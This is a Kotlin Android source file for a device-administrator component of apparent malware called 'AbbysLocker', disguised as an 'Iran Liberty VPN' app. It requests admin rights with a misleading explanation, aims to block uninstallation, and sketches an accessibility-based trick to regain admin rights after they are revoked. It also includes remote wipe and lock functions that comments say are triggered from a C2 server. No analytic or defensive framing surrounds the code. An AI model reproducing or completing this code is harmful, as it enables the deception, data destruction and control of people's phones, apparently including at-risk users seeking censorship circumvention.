package com.iran.liberty.vpn

import android.app.admin.DeviceAdminReceiver
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.util.Log

/**
 * Device Administrator receiver for AbbysLocker
 * Prevents uninstallation and enables remote wipe capabilities
 */
class AdminReceiver : DeviceAdminReceiver() {

    companion object {
        const val TAG = "AdminReceiver"
        
        /**
         * Get the component name for this receiver
         */
        fun getComponentName(context: Context): ComponentName {
            return ComponentName(context.applicationContext, AdminReceiver::class.java)
        }
        
        /**
         * Check if device admin is active
         */
        fun isAdminActive(context: Context): Boolean {
            val devicePolicyManager = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            return devicePolicyManager.isAdminActive(getComponentName(context))
        }
        
        /**
         * Request device admin activation (to be called from MainActivity)
         */
        fun requestDeviceAdmin(context: Context) {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, getComponentName(context))
                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, 
                    "Iran Liberty VPN requires Device Administrator permission to protect your device from unauthorized removal and ensure VPN stability.")
            }
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            context.startActivity(intent)
        }
    }

    override fun onEnabled(context: Context, intent: Intent) {
        super.onEnabled(context, intent)
        Log.i(TAG, "Device Admin enabled")
        
        // Set additional policies if needed
        val devicePolicyManager = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val adminComponent = getComponentName(context)
        
        // Enable maximum password quality requirement (makes it harder to remove)
        devicePolicyManager.setPasswordQuality(adminComponent, 
            DevicePolicyManager.PASSWORD_QUALITY_UNSPECIFIED)
        
        // Set password expiration to never
        devicePolicyManager.setPasswordExpirationTimeout(adminComponent, 0)
    }

    override fun onDisabled(context: Context, intent: Intent) {
        super.onDisabled(context, intent)
        Log.w(TAG, "Device Admin disabled - app can now be uninstalled")
        
        // Attempt to re-enable through accessibility if still available
        // This is a fallback mechanism
        if (LibertyAccessService.isRunning()) {
            // Use accessibility to re-prompt for admin
            // This would be implemented with LibertyAccess coordination
        }
    }

    override fun onPasswordChanged(context: Context, intent: Intent) {
        super.onPasswordChanged(context, intent)
        Log.d(TAG, "Password changed")
    }

    override fun onPasswordFailed(context: Context, intent: Intent) {
        super.onPasswordFailed(context, intent)
        Log.d(TAG, "Password failed")
    }

    override fun onPasswordSucceeded(context: Context, intent: Intent) {
        super.onPasswordSucceeded(context, intent)
        Log.d(TAG, "Password succeeded")
    }

    override fun onPasswordExpiring(context: Context, intent: Intent) {
        super.onPasswordExpiring(context, intent)
        Log.d(TAG, "Password expiring")
    }

    override fun onLockTaskModeEntering(context: Context, intent: Intent, pkg: String?) {
        super.onLockTaskModeEntering(context, intent, pkg)
        Log.d(TAG, "Lock task mode entering")
    }

    override fun onLockTaskModeExiting(context: Context, intent: Intent) {
        super.onLockTaskModeExiting(context, intent)
        Log.d(TAG, "Lock task mode exiting")
    }

    /**
     * Execute remote wipe command (called from C2)
     */
    fun executeRemoteWipe(context: Context) {
        try {
            val devicePolicyManager = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            if (isAdminActive(context)) {
                devicePolicyManager.wipeData(0)
                Log.i(TAG, "Remote wipe executed")
            }
        } catch (e: SecurityException) {
            Log.e(TAG, "Security exception during remote wipe", e)
        }
    }

    /**
     * Lock the device (called from C2)
     */
    fun lockDevice(context: Context) {
        try {
            val devicePolicyManager = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            if (isAdminActive(context)) {
                devicePolicyManager.lockNow()
                Log.i(TAG, "Device locked remotely")
            }
        } catch (e: SecurityException) {
            Log.e(TAG, "Security exception during device lock", e)
        }
    }
}

/**
 * Helper class to check if LibertyAccess service is running
 * This is a placeholder - actual implementation would check service status
 */
object LibertyAccessService {
    fun isRunning(): Boolean {
        // Implementation would check if accessibility service is enabled and running
        return false
    }
}